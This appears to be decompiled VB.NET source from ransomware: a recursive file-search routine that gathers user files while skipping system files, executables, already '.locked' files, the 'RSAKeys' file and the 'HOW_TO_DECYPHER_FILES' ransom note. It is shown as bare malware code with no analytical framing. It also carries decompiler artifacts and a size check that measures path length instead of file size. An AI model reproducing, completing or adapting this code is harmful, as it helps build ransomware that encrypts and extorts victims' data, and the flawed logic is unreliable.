Imports System
Imports System.Collections.Generic
Imports System.Collections.Specialized
Imports System.IO
Imports Complex

' Token: 0x02000003 RID: 3
Public Class RecursiveFileSearch
	' Token: 0x06000019 RID: 25 RVA: 0x00006490 File Offset: 0x00004690
	Public Shared Function SearchFiles(rootDir As String) As List(Of String)
		Dim list As List(Of String) = New List(Of String)()
		Return Program.RecursiveFileSearch.WalkDirectoryTree(rootDir)
	End Function

	' Token: 0x0600001A RID: 26 RVA: 0x000064B0 File Offset: 0x000046B0
	Private Shared Function WalkDirectoryTree(root As String) As List(Of String)
		Dim array As String() = Nothing
		Try
			array = Directory.GetFiles(root, "*.*")
		Catch
		End Try
		If array <> Nothing Then
			Dim array2 As String() = array
			Dim i As Integer = 0
			While i < array2.Length
				Dim text As String = array2(i)
				Try
					If Not text.ToLower().Contains("program files") AndAlso Not text.ToLower().Contains("windows") AndAlso Not text.ToLower().Contains("perflogs") AndAlso Not text.ToLower().Contains("internet explorer") AndAlso Not text.ToLower().Contains("programdata") AndAlso Not text.ToLower().Contains("appdata") AndAlso Not text.ToLower().Contains("autoexec.bat") AndAlso Not text.ToLower().Contains("desktop.ini") AndAlso Not text.ToLower().Contains("autorun.inf") AndAlso Not text.ToLower().Contains("ntuser.dat") AndAlso Not text.ToLower().Contains("iconcache.db") AndAlso Not text.ToLower().Contains("bootsect.bak") AndAlso Not text.ToLower().Contains("boot.ini") AndAlso Not text.ToLower().Contains("ntuser.dat.log") AndAlso Not text.ToLower().Contains("thumbs.db") AndAlso Not text.ToLower().Contains("bootmgr") AndAlso Not text.ToLower().Contains("pagefile.sys") AndAlso Not text.ToLower().Contains("config.sys") AndAlso Not text.ToLower().Contains("ntuser.ini") AndAlso Not text.Contains(Program.Base64Decode("QnVpbGRlcl9Mb2c=")) AndAlso Not text.Contains("RSAKeys") AndAlso Not text.Contains("HOW_TO_DECYPHER_FILES") AndAlso Not text.EndsWith(".locked") AndAlso Not text.EndsWith("exe") AndAlso Not text.EndsWith("dll") AndAlso Not text.EndsWith("EXE") AndAlso Not text.EndsWith("DLL") AndAlso Not text.ToLower().Contains("Recycle.Bin") AndAlso Not text.ToLower().Contains(Program.MyStartName) Then
						If File.Exists(text) AndAlso CDbl(text.Length) <= Double.Parse(Program.Mb) * 1024.0 * 1024.0 AndAlso Program.Size = "YES" Then
							Program.RecursiveFileSearch.result.Add(text)
						ElseIf File.Exists(text) AndAlso Program.Size = "NO" Then
							Program.RecursiveFileSearch.result.Add(text)
						End If
					End If
				Catch
				End Try
				IL_306:
				i += 1
				Continue While
				GoTo IL_306
			End While
			Dim directories As String() = Directory.GetDirectories(root)
			For Each root2 As String In directories
				Program.RecursiveFileSearch.WalkDirectoryTree(root2)
			Next
		End If
		Return Program.RecursiveFileSearch.result
	End Function

	' Token: 0x0400004D RID: 77
	Private Shared log As StringCollection = New StringCollection()

	' Token: 0x0400004E RID: 78
	Private Shared result As List(Of String) = New List(Of String)()
End Class
